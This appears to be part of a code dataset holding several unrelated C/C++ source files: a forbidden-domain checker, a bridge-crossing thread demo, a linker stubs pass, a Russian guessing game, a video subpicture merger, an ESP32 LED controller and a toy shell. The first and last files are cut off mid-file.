rhs) {\n                                return rhs.IsSubdomain(lhs);\n                            });\n        domains_.erase(new_last, domains_.end());\n    }\n\n    bool IsForbidden(const Domain& domain) {\n        auto it = upper_bound(domains_.begin(), domains_.end(), domain);\n        return it != domains_.begin() && domain.IsSubdomain(*(--it));\n    }\n\n    const vector<Domain>& GetData() const {\n        return domains_;\n    }\n\nprivate:\n    vector<Domain> domains_;\n};\n\nvector<Domain> ReadDomains(istream& input, size_t n) {\n    vector<Domain> domains;\n    for (size_t i = 0; i < n; ++i) {\n        string str;\n        getline(input, str);\n        domains.push_back(Domain{str});\n    }\n    return domains;\n}\n\ntemplate <typename Number>\nNumber ReadNumberOnLine(istream& input) {\n    string line;\n    getline(input, line);\n\n    Number num;\n    std::istringstream(line) >> num;\n\n    return num;\n}\n\nvoid TestDomain() {\n\nusing namespace std::literals;\n\n    // constructor tests\n    {\n        Domain domain(\"ru\"s);\n        auto test_domain_data = domain.GetData();\n        assert(test_domain_data == \"ur.\"s);\n    }\n\n    {\n        Domain domain(\"hawk.ru\"s);\n        auto test_domain_data = domain.GetData();\n        assert(test_domain_data == \"ur.kwah.\"s);\n    }\n\n    // operator== tests\n    {\n        Domain lhs_domain(\"tickets.hawk.ru\"s);\n        Domain rhs_domain(\"tickets.hawk.ru\"s);\n        assert(lhs_domain == rhs_domain);\n        assert(lhs_domain == Domain(\"tickets.hawk.ru\"s));\n        assert(!(lhs_domain == Domain(\"vip.tickets.hawk.ru\"s)));\n        assert(!(lhs_domain == Domain(\"hawk.ru\"s)));\n    }\n\n    // IsSubDomain tests\n    {\n        Domain domain(\"ru\"s);\n        Domain subdomain(\"hawk.ru\"s);\n        assert(subdomain.IsSubdomain(domain));\n        assert(Domain{\"tickets.hawk.ru\"s}.IsSubdomain(subdomain));\n        assert(Domain{\"tickets.hawk.ru\"s}.IsSubdomain(domain));\n        assert(!Domain{\"tickets.hawk.ru\"s}.IsSubdomain(Domain{\"black_hawk.ru\"s}));\n    }\n}\n\nvoid TestDomainChecker() {\n\nusing namespace std::literals;\n\n    // constuctor tests\n    {\n        vector<Domain> domains = {Domain{\"kz\"s}, Domain{\"com\"s}, Domain{\"hawk.ru\"s}};\n        DomainChecker domain_checker{domains.begin(), domains.end()};\n        auto test_domain_checker_data = domain_checker.GetData();\n        assert(test_domain_checker_data.size() == 3);\n        assert(test_domain_checker_data.back() == Domain{\"kz\"s});\n    }\n\n    // IsForbidden tests\n    {\n        vector<Domain> domains = {Domain{\"kz\"s}, Domain{\"com\"s}, Domain{\"hawk.ru\"s}};\n        DomainChecker domain_checker{domains.begin(), domains.end()};\n        assert(domain_checker.IsForbidden(Domain{\"kz\"s}));\n        assert(domain_checker.IsForbidden(Domain{\"hawk.ru\"s}));\n        assert(domain_checker.IsForbidden(Domain{\"tickets.hawk.ru\"s}));\n        assert(!domain_checker.IsForbidden(Domain{\"black_hawk.ru\"s}));\n        assert(!domain_checker.IsForbidden(Domain{\"ru\"s}));\n    }\n}\n\nint main() {\n    TestDomain();\n    TestDomainChecker();\n\n    const std::vector<Domain> forbidden_domains = ReadDomains(cin, ReadNumberOnLine<size_t>(cin));\n    DomainChecker checker(forbidden_domains.begin(), forbidden_domains.end());\n\n    const std::vector<Domain> test_domains = ReadDomains(cin, ReadNumberOnLine<size_t>(cin));\n    for (const Domain& domain : test_domains) {\n        cout << (checker.IsForbidden(domain) ? \"Bad\"sv : \"Good\"sv) << endl;\n    }\n}",
    "#include<bits/stdc++.h>\n#include <thread>\n#include <mutex>\n#include <condition_variable>\n\nusing namespace std;\nconst int MAX_CARS = 3; // Maximum cars allowed on the bridge\nint cars_on_bridge = 0;\nint current_direction = -1; // -1 indicates no direction is set\nstd::mutex bridge_mutex;\nstd::condition_variable bridge_condition;\n\nvoid ArriveBridge(int id, int direction) {\n    std::unique_lock<std::mutex> lock(bridge_mutex);\n    while ((current_direction != -1 && current_direction != direction) || cars_on_bridge == MAX_CARS) {\n        // Wait until the bridge is empty or cars in the same direction are crossing\n        bridge_condition.wait(lock);\n    }\n    current_direction = direction;\n    cars_on_bridge++;\n    std::cout << \"Car \" << id << \" is crossing the bridge in direction \" << direction << std::endl;\n}\n\nvoid ExitBridge(int id, int direction) {\n    std::unique_lock<std::mutex> lock(bridge_mutex);\n    cars_on_bridge--;\n    if (cars_on_bridge == 0) {\n        current_direction = -1;\n        // Notify all waiting cars since the bridge is now empty\n        bridge_condition.notify_all();\n    }\n    else {\n        // Notify one car in the same direction\n        bridge_condition.notify_one();\n    }\n    std::cout << \"Car \" << id << \" has exited the bridge in direction \" << direction << std::endl;\n}\n\nvoid Car(int id, int direction) {\n    ArriveBridge(id, direction);\n    std::this_thread::sleep_for(std::chrono::seconds(1)); // Simulate crossing time\n    ExitBridge(id, direction);\n}\n\nint main() {\n    std::vector<std::thread> cars;\n    // Create and start threads (cars)\n    for (int i = 0; i < 10; ++i) {\n        cars.push_back(std::thread(Car, i, i % 2));\n    }\n    // Join threads with the main thread\n    for (auto& car : cars) {\n        car.join();\n    }\n    //car [i] = \n    return 0;\n}",
    "/* -*- mode: C++; c-basic-offset: 4; tab-width: 4 -*-\n *\n * Copyright (c) 2009-2010 Apple Inc. All rights reserved.\n *\n * @APPLE_LICENSE_HEADER_START@\n *\n * This file contains Original Code and/or Modifications of Original Code\n * as defined in and that are subject to the Apple Public Source License\n * Version 2.0 (the 'License'). You may not use this file except in\n * compliance with the License. Please obtain a copy of the License at\n * http://www.opensource.apple.com/apsl/ and read it before using this\n * file.\n *\n * The Original Code and all software distributed under the License are\n * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER\n * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,\n * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.\n * Please see the License for the specific language governing rights and\n * limitations under the License.\n *\n * @APPLE_LICENSE_HEADER_END@\n */\n\n\n\n#include <stdint.h>\n#include <math.h>\n#include <unistd.h>\n#include <assert.h>\n#include <libkern/OSByteOrder.h>\n\n#include <algorithm>\n#include <vector>\n\n#include \"Options.h\"\n#include \"MachOFileAbstraction.hpp\"\n#include \"Containers.h\"\n#include \"ld.hpp\"\n\n#include \"make_stubs.h\"\n\n\nnamespace ld {\nnamespace passes {\nnamespace stubs {\n\nclass Pass {\npublic:\n\t\t\t\t\t\t\t\tPass(const Options& opts);\n\tvoid\t\t\t\t\t\tprocess(ld::Internal& internal);\n\tvoid\t\t\t\t\t\taddAtom(const ld::Atom& atom)\t{ _internal->addAtom(atom); }\n\tbool\t\t\t\t\t\tusingCompressedLINKEDIT() const { return _compressedLINKEDIT; }\n\tld::Internal*\t\t\t\tinternal() { return _internal; }\n\n\tAtom*\t\t\t\t\t\tcompressedHelperHelper;\n\tAtom*\t\t\t\t\t\tcompressedImageCache;\n\tAtom*\t\t\t\t\t\tcompressedFastBinderPointer;\n\tconst bool\t\t\t\t\tusingDataConstSegment;\n\nprivate:\n\n\tstruct AtomByNameSorter\n\t{\n\t\t bool operator()(const ld::Atom* left, const ld::Atom* right)\n\t\t {\n\t\t\t  return (strcmp(left->name(), right->name()) < 0);\n\t\t }\n\t};\n\n\tconst ld::Atom*\t\t\t\tstubableFixup(const ld::Fixup* fixup, ld::Internal&);\n\tld::Atom*\t\t\t\t\tmakeStub(const ld::Atom& target, bool weakImport);\n\tvoid\t\t\t\t\t\tverifyNoResolverFunctions(ld::Internal& state);\n\n\tconst Options&\t\t\t\t_options;\n\tconst cpu_type_t\t\t\t_architecture;\n\tconst bool\t\t\t\t\t_compressedLINKEDIT;\n\tconst bool\t\t\t\t\t_mightBeInSharedRegion;\n\tconst bool\t\t\t\t\t_pic;\n\tconst bool\t\t\t\t\t_flatNamespace;\n\tld::Internal*\t\t\t\t_internal;\n\tuint32_t\t\t\t\t\t_stubCount;\n\tbool\t\t\t\t\t\t_largeText;\n};\n\n#include \"stub_x86_64.hpp\"\n#include \"stub_x86_64_classic.hpp\"\n#include \"stub_x86.hpp\"\n#include \"stub_x86_classic.hpp\"\n#include \"stub_arm.hpp\"\n#include \"stub_arm_classic.hpp\"\n#if SUPPORT_ARCH_arm64\n#include \"stub_arm64.hpp\"\n#endif\n#if SUPPORT_ARCH_arm64e\n#include \"stub_arm64e.hpp\"\n#endif\n#if SUPPORT_ARCH_arm64_32\n#include \"stub_arm64_32.hpp\"\n#endif\n\nPass::Pass(const Options& opts) \n\t:\tcompressedHelperHelper(NULL), \n\t\tcompressedImageCache(NULL),\n\t\tcompressedFastBinderPointer(NULL),\n\t\tusingDataConstSegment(opts.useDataConstSegment()),\n\t\t_options(opts),\n\t\t_architecture(opts.architecture()),\n\t\t_compressedLINKEDIT(opts.makeCompressedDyldInfo()),\n\t\t_mightBeInSharedRegion(opts.sharedRegionEligible()), \n\t\t_pic(opts.outputSlidable()),\n\t\t_flatNamespace(opts.nameSpace() != Options::kTwoLevelNameSpace),\n\t\t_internal(NULL), _stubCount(0), _largeText(false)\n{\n\t\n} \n\n\nconst ld::Atom* Pass::stubableFixup(const ld::Fixup* fixup, ld::Internal& state)\n{\n\tif ( fixup->binding == ld::Fixup::bindingsIndirectlyBound ) {\n\t\tconst ld::Atom* target = state.indirectBindingTable[fixup->u.bindingIndex];\n\t\tswitch ( fixup->kind ) {\n\t\t\tcase ld::Fixup::kindStoreTargetAddressX86BranchPCRel32:\n\t\t\tcase ld::Fixup::kindStoreTargetAddressARMBranch24:\n\t\t\tcase ld::Fixup::kindStoreTargetAddressThumbBranch22:\n#if SUPPORT_ARCH_arm64\n\t\t\tcase ld::Fixup::kindStoreTargetAddressARM64Branch26:\n#endif\n                assert(target != NULL);\n\t\t\t\t// create stub if target is in a dylib\n\t\t\t\tif ( target->definition() == ld::Atom::definitionProxy ) \n\t\t\t\t\treturn target;\n\t\t\t\t// use stub if target is a resolver function in same linkage unit\n\t\t\t\tif ( target->contentType() == ld::Atom::typeResolver ) \n\t\t\t\t\treturn target;\n\t\t\t\tif ( target->scope() == ld::Atom::scopeGlobal ) {\t\n\t\t\t\t\t// create stub if target is global weak definition in symbol table\n\t\t\t\t\tif ( (target->definition() == ld::Atom::definitionRegular) \n\t\t\t\t\t\t&& (target->combine() == ld::Atom::combineByName) \n\t\t\t\t\t\t&& ((target->symbolTableInclusion() == ld::Atom::symbolTableIn) \n\t\t\t\t\t\t || (target->symbolTableInclusion() == ld::Atom::symbolTableInAndNeverStrip)) ) {\n\t\t\t\t\t\t// don't make stubs for auto-hide symbols\n\t\t\t\t\t\tif ( target->autoHide() && (!_options.hasExportMaskList() || !_options.shouldExport(target->name())) )\n\t\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t\treturn target;\n\t\t\t\t\t}\n\t\t\t\t\t// create stub if target is interposable\n\t\t\t\t\tif ( _options.interposable(target->name()) ) \n\t\t\t\t\t\treturn target;\n\t\t\t\t\tif ( _flatNamespace ) {\n\t\t\t\t\t\t// flat namespace does not indirect calls within main exectuables\n\t\t\t\t\t\tif ( _options.outputK",
    "\ufeff#include <unordered_map>\n#include <iostream>\n#include <vector>\n#include <utility>\n#include <clocale>\nusing namespace std;\nint ran1(vector <pair<string, vector<string>>> x) {\n\tint ran = rand() % x.size();\n\treturn ran;\n};\n\n\nint main()\n{\n\tsetlocale(LC_ALL, \"RUSSIAN\");\n\tsrand(time(0));\n\tint mis = 0;\n\tstring srart;\n\tstring isov;\n\tvector<string> frt = {\"\u041f\u043e\u0442\u043e\u043c\u043e\u043a \u0432\u043e\u043b\u043a\u043e\u0432\", \"\u0418\u043c\u0435\u0435\u0442 \u0447\u0435\u0442\u044b\u0440\u0435 \u043b\u0430\u043f\u044b\", \"\u041e\u0445\u0440\u0430\u043d\u044f\u0435\u0442 \u0434\u043e\u043c\", \"\"};\n\tvector<string> firt = {\"\u0418\u043c\u0435\u0435\u0442 \u043e\u0441\u0442\u0440\u044b\u0435 \u043a\u043e\u0433\u0442\u0438\", \"\u041c\u043d\u043e\u0433\u043e \u0441\u043f\u0438\u0442\", \"\u0423 \u043d\u0435\u0435 9 \u0436\u0438\u0437\u043d\u0435\u0439\", \"\"};\n\tvector<string> frot = {\"\u0416\u0438\u0432\u0435\u0442 \u0432 \u0410\u0444\u0440\u0438\u043a\u0435\", \"\u0426\u0430\u0440\u044c \u0437\u0432\u0435\u0440\u0435\u0439\", \"\u041f\u0440\u043e \u043d\u0435\u0433\u043e \u0441\u043d\u044f\u043b\u0438 \u043c\u0443\u043b\u044c\u0442\u0438\u043a\", \"\"};\n\tpair<string, vector<string>> coup(\"dog\", frt);\n\tpair<string, vector<string>> cop(\"cat\", firt);\n\tpair<string, vector<string>> cup(\"lion\", frot);\n\n\n\tbool start = true;\n\tvector <pair<string, vector<string>>> sql = {coup, cop, cup};\n\tvector <pair<string, vector<string>>> used;\n\tcout << \"-------------------------------------------\"<< endl;\n\tcout << \"----------\u0414\u043e\u0431\u0440\u043e \u043f\u043e\u0436\u0430\u043b\u043e\u0432\u0430\u0442\u044c \u0432 \u0438\u0433\u0440\u0443----------\"<< endl;\n\tcout << \"-------------------------------------------\"<< endl;\n\tcout << \"\u041d\u0430\u0447\u043d\u0435\u043c: \";\n\tcin >> srart;\n\tif (srart != \"start\") {\n\t\treturn 0;\n\t}\n\twhile (start == true) {\n\t\tbool game = true;\n\n\t\t\tint ran = ran1(sql);\n\t\t\tpair <string, vector<string>> nef = sql[ran];\n\t\t\t\n\t\t\t\n\t\t     \n\t\t\tstring gue;\n\t\t\tcout << \"\u041f\u0435\u0440\u0432\u0430\u044f \u043f\u043e\u0434\u0441\u043a\u0430\u0437\u043a\u0430: \" << nef.second[0] << endl;\n\t\t\twhile (game == true) {\n\t\t\tcin >> gue;\n\t\t\tif (gue == \"finish\") {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\telse if (gue != nef.first) {\n\t\t\t\tmis += 1;\n\t\t\t\tcout << \"\u0421\u043b\u0435\u0434\u0443\u0449\u0430\u044f \u043f\u043e\u0434\u0441\u043a\u0430\u0437\u043a\u0430: \" << nef.second[mis] << endl;\n\t\t\t\t\n\t\t\t\tif (mis == 3) {\n\t\t\t\t\tcout << \"\u0412\u044b \u043f\u0440\u043e\u0438\u0433\u0440\u0430\u043b\u0438\"<< endl;\n\t\t\t\t\tgame = false;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} \n\t\t\t\n\t\t\tif (gue == nef.first) {\n\t\t\t\tcout << \"\u041c\u043e\u043b\u043e\u0434\u0435\u0446!\" << endl;\n\t\t\t\tgame = false;\n\t\t\t }\n\n\t\t}\n\t\tcout << \"\u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u043c?\" << endl;\n\t\tcin >> isov;\n\t\tif (isov == \"yes\") {\n\t\t\tstart;\n\t\t\tmis = 0;\n\t\t}\n\t\telse {\n\t\t\tstart = false;\n\t\t}\n\t}\n}\n",
    "/* The copyright in this software is being made available under the BSD\n* License, included below. This software may be subject to other third party\n* and contributor rights, including patent rights, and no such rights are\n* granted under this license.\n*\n* Copyright (c) 2010-2024, ITU/ISO/IEC\n* All rights reserved.\n*\n* Redistribution and use in source and binary forms, with or without\n* modification, are permitted provided that the following conditions are met:\n*\n*  * Redistributions of source code must retain the above copyright notice,\n*    this list of conditions and the following disclaimer.\n*  * Redistributions in binary form must reproduce the above copyright notice,\n*    this list of conditions and the following disclaimer in the documentation\n*    and/or other materials provided with the distribution.\n*  * Neither the name of the ITU/ISO/IEC nor the names of its contributors may\n*    be used to endorse or promote products derived from this software without\n*    specific prior written permission.\n*\n* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n* ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS\n* BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n* CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n* CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n* ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF\n* THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n /** \\file     SubpicMergeApp.cpp\n     \\brief    Subpicture merge application\n */\n\n#include <cstdio>\n#include <cctype>\n#include <vector>\n#include <utility>\n#include <fstream>\n#include <sstream>\n#include <ios>\n#include <algorithm>\n#include \"CommonDef.h\"\n#include \"VLCReader.h\"\n#include \"AnnexBread.h\"\n#include \"NALread.h\"\n#include \"Slice.h\"\n#include \"VLCWriter.h\"\n#include \"NALwrite.h\"\n#include \"AnnexBwrite.h\"\n#include \"SubpicMergeApp.h\"\n#include \"SEIread.h\"\n#include \"SEIEncoder.h\"\n#include \"SEIwrite.h\"\n\n\n //! \\ingroup SubpicMergeApp\n //! \\{\n\n\nstatic constexpr int MIXED_NALU_PPS_OFFSET = 8;\n\n\nstruct Subpicture {\n  int                                  width;\n  int                                  height;\n  int                                  topLeftCornerX;\n  int                                  topLeftCornerY;\n  std::ifstream                        *fp;\n  InputByteStream                      *bs;\n  bool                                 firstSliceInPicture;\n  std::vector<InputNALUnit>            nalus;\n  std::vector<AnnexBStats>             stats;\n  int                                  prevTid0Poc;\n  bool                                 dciPresent;\n  DCI                                  dci;\n  ParameterSetManager                  psManager;\n  std::vector<int>                     vpsIds;\n  std::vector<int>                     spsIds;\n  std::vector<int>                     ppsIds;\n  std::vector<std::pair<int, ApsType>> apsIds;\n  PicHeader                            picHeader;\n  std::vector<Slice>                   slices;\n  std::vector<OutputBitstream>         sliceData;\n  SEI                                  *decodedPictureHashSei;\n};\n\n\nSubpicMergeApp::SubpicMergeApp(std::vector<SubpicParams> &subpicParams, std::ofstream &outputStream) :\n  m_outputStream(outputStream),\n  m_prevPicPOC(std::numeric_limits<int>::max())\n{\n  m_subpics = new std::vector<Subpicture>;\n  m_subpics->resize(subpicParams.size());\n  for (int i = 0; i < (int)subpicParams.size(); i++)\n  {\n    Subpicture &subpic = m_subpics->at(i);\n    subpic.width          = subpicParams[i].width;\n    subpic.height         = subpicParams[i].height;\n    subpic.topLeftCornerX = subpicParams[i].topLeftCornerX;\n    subpic.topLeftCornerY = subpicParams[i].topLeftCornerY;\n    subpic.fp             = &subpicParams[i].fp;\n  }\n\n  getOutputPicSize();\n}\n\nSubpicMergeApp::~SubpicMergeApp()\n{\n  delete m_subpics;\n}\n\n\n/**\n  - Compute output picture size from subpicture sizes\n */\nvoid SubpicMergeApp::getOutputPicSize()\n{\n  m_picWidth  = 0;\n  m_picHeight = 0;\n\n  for (auto &subpic : *m_subpics)\n  {\n    m_picWidth  = std::max(m_picWidth,  subpic.topLeftCornerX + subpic.width);\n    m_picHeight = std::max(m_picHeight, subpic.topLeftCornerY + subpic.height);\n  }\n}\n\n\n/**\n - lookahead through next NAL units to determine if current NAL unit is the first NAL unit in a new picture\n */\nbool SubpicMergeApp::isNewPicture(std::ifstream *bitstreamFile, InputByteStream *bytestream, bool firstSliceInPicture)\n{\n  bool ret = false;\n  bool finished = false;\n\n  // cannot be a new picture if there haven't been any slices yet\n  if(firstSliceInPicture)\n  {\n    return false;\n  }\n\n  // save stream position for backup\n#if RExt__DECODER_D",
    "#include <Arduino.h>\n#include <GyverPortal.h>\n#include <FastLED.h>\n#include \"WiFi.h\"\n#include \"EEPROM.h\"\n\n// Global variables\n#define LED_PIN 32\n#define LED_COUNT 180\n#define AP_SSID \"Alien\"\n#define AP_PASS \"bezparolianehodi\"\n\n// FastLED\nstruct CRGB leds[LED_COUNT];\n\n// EEPROM\nbool eepromFlag = false;\nunsigned long eepromTimer = 0;\n\nint STEP = 20;\nint ihue = 0;\nint thissat = 255;\nunsigned long lastmillis = 0;\n\n\nstruct Data {\n  int eff_index;\n  bool power;\n  int BRIGHT;\n  float SPEED = 50;\n  int currentEffect = 0;\n  GPcolor rgb;\n};\n\nData data;\n\nGyverPortal ui;\n\n// \u0421\u043f\u0438\u0441\u043e\u043a \u044d\u0444\u0444\u0435\u043a\u0442\u043e\u0432\nString effects[6] = {\n    \"Static\",\n    \"Rainbow LOOP\",\n    \"Rainbow Fade\",\n    \"Rainbow Cycle\",\n    \"Fire\",\n    \"\"};\n\nvoid oneColorAll()\n{ //-SET ALL LEDS TO ONE COLOR\n  for (int i = 0; i < LED_COUNT; i++)\n  {\n    leds[i].setRGB(data.rgb.r, data.rgb.g, data.rgb.b);\n  }\n  FastLED.setBrightness(data.BRIGHT);\n  FastLED.show();\n}\n\nvoid clearLED()\n{\n  for (int i = 0; i < LED_COUNT; i++)\n  {\n    leds[i].setRGB(0, 0, 0);\n  }\n  FastLED.setBrightness(0);\n  FastLED.show();\n}\n\nvoid rainbowFade()\n{ //-m2-FADE ALL LEDS THROUGH HSV RAINBOW\n  if (lastmillis + data.SPEED < millis() && data.power)\n  {\n    ihue++;\n    if (ihue > 255)\n    {\n      ihue = 0;\n    }\n    for (int idex = 0; idex < LED_COUNT; idex++)\n    {\n      leds[idex] = CHSV(ihue, thissat, 255);\n    }\n    LEDS.setBrightness(data.BRIGHT);\n    LEDS.show();\n    lastmillis = millis();\n  }\n}\n\nvoid rainbowLoop()\n{ //-m3-LOOP HSV RAINBOW\n  if (lastmillis + data.SPEED < millis() && data.power)\n  {\n    for(int idex = 0; idex < LED_COUNT; idex++){\n      ihue = ihue + STEP;\n\n      if (ihue > 255)\n      {\n        ihue = 0;\n      }\n        leds[idex] = CHSV(ihue, thissat, 255);\n\n      FastLED.setBrightness(data.BRIGHT);\n      FastLED.show();\n      lastmillis = millis();\n    }\n  }\n}\n\nvoid rainbowCycle(){\n  byte r, g, b;\n  if(lastmillis + 500 < millis() && data.power){\n    for(uint16_t i = 0; i < 256 * 2; i++){\n      for(uint16_t j = 0; j < LED_COUNT; j++){\n        byte WheelPos = ((j * 256 / LED_COUNT) + i) & 255;\n        if(WheelPos < 85){\n          r = WheelPos * 3;\n          g = 255 - WheelPos * 3;\n          b = 0;\n        }else if(WheelPos < 170){\n          r = 255 - WheelPos * 3;\n          g = 0;\n          b = WheelPos * 3;\n        }else{\n          r = 0;\n          g = WheelPos * 3;\n          b = 255 - WheelPos * 3;\n        }\n        leds[j].setRGB(r, g, b);\n      }\n       FastLED.show();\n    }\n    FastLED.setBrightness(data.BRIGHT);\n    lastmillis = millis();\n  }\n}\n\nvoid Fire(){\n  if(lastmillis + 80 < millis() && data.power){\n    int temprand;\n      for (int i = 0; i < LED_COUNT; i++ ) {\n        temprand = random(100, 255);\n        leds[i].r = temprand;\n        leds[i].b = 0; leds[i].g = 30;\n      }\n      LEDS.show();\n    FastLED.setBrightness(data.BRIGHT);\n    lastmillis = millis();\n  }\n};\n\n\n// \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u044b\nvoid build(GyverPortal &p)\n{\n  GP.BUILD_BEGIN(GP_DARK);\n  GP.PAGE_TITLE(\"ESPLight\");\n\n  GP.TITLE(\"ESPLight\");\n  GP.BREAK();\n\n  GP.BLOCK_BEGIN(\"Effect\");\n  GP.SPAN(\"Effect:\");\n  GP.SELECT(\"Eff_SEL\", effects, data.eff_index, true, 0, 0);\n  GP.RELOAD_CLICK(\"Eff_SEL\");\n  GP.BLOCK_END();\n  GP.BREAK();\n\n  GP.BLOCK_BEGIN(\"Settings\");\n  GP.TITLE(\"Settings\");\n  GP.SPAN(effects[data.eff_index]);\n  GP.BREAK();\n  switch (data.eff_index)\n  {\n  case 0:\n    GP.BOX_BEGIN();\n    GP.SPAN(\"POWER:\");\n    GP.SWITCH(\"POWER\", data.power);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"RGB:\");\n    GP.COLOR(\"RGB\", data.rgb);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Brightness:\");\n    GP.SLIDER(\"BRIGHT\", data.BRIGHT, 0, 255);\n    GP.BOX_END();\n    break;\n  case 1:\n    GP.BOX_BEGIN();\n    GP.SPAN(\"POWER:\");\n    GP.SWITCH(\"POWER\", data.power);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Brightness:\");\n    GP.SLIDER(\"BRIGHT\", data.BRIGHT, 0, 255);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Speed:\");\n    GP.SLIDER(\"SPEED\", data.SPEED, 0, 100, 2);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Step:\");\n    GP.SLIDER(\"STEP\", STEP, 0, LED_COUNT);\n    GP.BOX_END();\n\n    break;\n  case 2:\n    GP.BOX_BEGIN();\n    GP.SPAN(\"POWER:\");\n    GP.SWITCH(\"POWER\", data.power);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Brightness:\");\n    GP.SLIDER(\"BRIGHT\", data.BRIGHT, 0, 255);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Speed:\");\n    GP.SLIDER(\"SPEED\", data.SPEED, 0, 100, 2);\n    GP.BOX_END();\n    break;\n  case 3:\n    GP.BOX_BEGIN();\n    GP.SPAN(\"POWER:\");\n    GP.SWITCH(\"POWER\", data.power);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Brightness:\");\n    GP.SLIDER(\"BRIGHT\", data.BRIGHT, 0, 255);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Speed:\");\n    GP.SLIDER(\"SPEED\", data.SPEED, 0, 100, 2);\n    GP.BOX_END();\n    break;\n  case 4:\n    GP.BOX_BEGIN();\n    GP.SPAN(\"POWER:\");\n    GP.SWITCH(\"POWER\", data.power);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.SPAN(\"Brightness:\");\n    GP.SLIDER(\"BRIGHT\", data.BRIGHT, 0, 255);\n    GP.BOX_END();\n    GP.BOX_BEGIN();\n    GP.S",
    "#include <iostream>\n#include <set>\n#include <vector>\n#include <string>\n#include <sys/stat.h>\n#include <filesystem>\n\nnamespace fs = std::filesystem;\n\nstd::set<std::string> supportedCommands = {\n  \"echo\", \"cd\", \"pwd\", \"ls\", \"exit\", \"type\",\n  \"\"\n};\n\nstd::set<std::string> builtinCommands = {\n  \"echo\",\"exit\",\"type\", \"pwd\", \"cd\"\n};\n\nbool running = true;\nint exit_code = 0;\nstd::string working_directory;\n\nvoid segment_query(std::vector<std::string>& query, std::string input, char separator);\nstd::string find_command(std::vector<std::string> pathDirectories, std::string command);\nbool valid_directory(std::string path);\n\nint main() {\n  const char* path = std::getenv(\"PATH\");\n  std::vector<std::string> pathDirectories;\n\n  segment_query(pathDirectories, path, ':');\n\n  working_directory = fs::current_path();\n\n  // Flush after every std::cout / std:cerr\n  std::cout << std::unitbuf;\n  std::cerr << std::unitbuf;\n\n  while (running) {\n    std::cout << \"$ \";\n\n    std::string input;\n    std::vector<std::string> query;\n\n    std::getline(std::cin, input);\n\n    segment_query(query, input, ' ');\n\n    std::string command = query[0];\n    std::string command_path;\n    command_path = find_command(pathDirectories, command);\n\n    if (command == \"exit\") {\n      running = false;\n      if (query.size() == 1)\n        exit_code = 0;\n      else\n        exit_code = stoi(query[1]);\n      break;\n    } else if (command == \"echo\") {\n        for (int i = 1; i < query.size(); i++) {\n          std::cout << query[i];\n          if (i != query.size() - 1)\n            std::cout << ' ';\n          else\n            std::cout << '\\n';\n        }\n    } else if (command == \"type\") {\n      const std::string &command2 = query[1];\n      std::string command2_path;\n      command2_path = find_command(pathDirectories, command2);\n      if (builtinCommands.contains(command2)) {\n        std::cout << command2 << \" is a shell builtin\\n\";\n      } else if (!command2_path.empty()) {\n        std::cout << command2 << \" is \" << command2_path << '\\n';\n      } else {\n        std::cerr << command2 << \": not found\\n\";\n      }\n    } else if (command == \"pwd\") {\n      std::cout << working_directory << '\\n';\n    } else if (command == \"cd\") {\n      fs::path directory_path;\n\n      if (query.size() == 1 || query[1][0] == '~') {\n        // No argument, change to home directory\n        const char* home = std::getenv(\"HOME\");\n        if (home) {\n          directory_path = home;\n        } else {\n          std::cerr << \"cd: HOME not set\\n\";\n          continue;\n        }\n      } else {\n        directory_path = query[1];\n      }\n\n      fs::path new_path;\n      if (directory_path.is_absolute()) {\n        new_path = directory_path;\n      } else {\n        new_path = working_directory / directory_path;\n      }\n\n      if (valid_directory(new_path.string())) {\n        working_directory = fs::canonical(new_path);\n      } else {\n        std::cerr << \"cd: \" << new_path.string() << \": No such file or directory\\n\";\n      }\n\n    } else if (!command_path.empty()) {\n      system(input.c_str());\n    } else if (!supportedCommands.contains(command)) {\n      std::cerr << command << \": command not found\\n\";\n    }\n\n  }\n  return exit_code;\n}\n\nvoid segment_query(std::vector<std::string>& query, std::string input, char separator) {\n    int inputLength = input.size();\n    int leftIndex = 0;\n    for (int i = 0; i < inputLength; i++) {\n        if (input[i] == separator) {\n          query.push_back(input.substr(leftIndex, i - leftIndex));\n          leftIndex = i + 1;\n        }\n    }\n    query.push_back(input.substr(leftIndex, 